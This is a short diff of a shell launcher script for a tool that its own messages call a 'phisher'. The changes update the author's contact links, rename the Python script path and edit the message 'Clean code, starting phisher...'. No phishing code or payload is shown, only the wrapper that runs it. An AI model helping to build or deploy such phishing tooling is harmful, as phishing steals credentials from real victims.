@@ -2,17 +2,15 @@
 
 # Author       : k4itrun
 # Github       : https://github.com/k4itrun
-# Contact      : https://m.me/k4itrun
-# Discord      : https://6889.fun/k4itrun
-# Email        : k4itrun@6889.fun
+# Discord      : https://billoneta.xyz/k4itrun
+# Email        : tsx@billoneta.xyz
 # Date         : 11-10-2023
 
 # If you don't know what you're doing, get out of here right now and use this with the instructions.
 
-ERIS="ep"
 VERSION="1.0"
 AUTHOR="\x6b\x34\x69\x74\x72\x75\x6e"
-ERIS_PATH="launch/$ERIS.py"
+ERIS_PATH="src/launch.py"
 CONFIG_FILE="assets/counter.txt"
 
 GREEN="\e[32m"
@@ -64,7 +62,7 @@ main() {
             echo "$COUNTER_L" > "$CONFIG_FILE"
         fi
 
-        echo -e "${SUCCESS} Clean code, starting $ERIS phisher... ${RESET}"
+        echo -e "${SUCCESS} Clean code, starting phisher... ${RESET}"
         loading  
         loading  
         python3 "$ERIS_PATH"
